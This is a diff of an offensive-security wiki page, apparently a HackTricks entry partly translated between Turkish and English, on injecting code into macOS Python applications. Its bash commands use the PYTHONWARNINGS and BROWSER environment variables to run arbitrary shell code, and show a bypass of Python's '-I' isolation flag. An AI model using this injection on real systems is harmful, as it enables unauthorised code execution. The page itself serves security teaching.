@@ -1,10 +1,10 @@
-# macOS Python Uygulamaları Enjeksiyonu
+# macOS Python Applications Injection
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## `PYTHONWARNINGS` ve `BROWSER` ortam değişkenleri aracılığıyla
+## Via `PYTHONWARNINGS` and `BROWSER` env variables
 
-Python çağrıldığında rastgele kod çalıştırmak için her iki ortam değişkenini de değiştirmek mümkündür, örneğin:
+Her iki environment variable değiştirilerek python çağrıldığında arbitrary code çalıştırılması mümkündür, örneğin:<sup>[[1]](#references)</sup>
 ```bash
 # Generate example python script
 echo "print('hi')" > /tmp/script.py
@@ -15,4 +15,8 @@ PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktri
 # RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
 BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
 ```
+## Referanslar
+
+- [1] [Environment Variables ile Hacking - elttam](https://www.elttam.com/blog/env/)
+
 {{#include ../../../banners/hacktricks-training.md}}
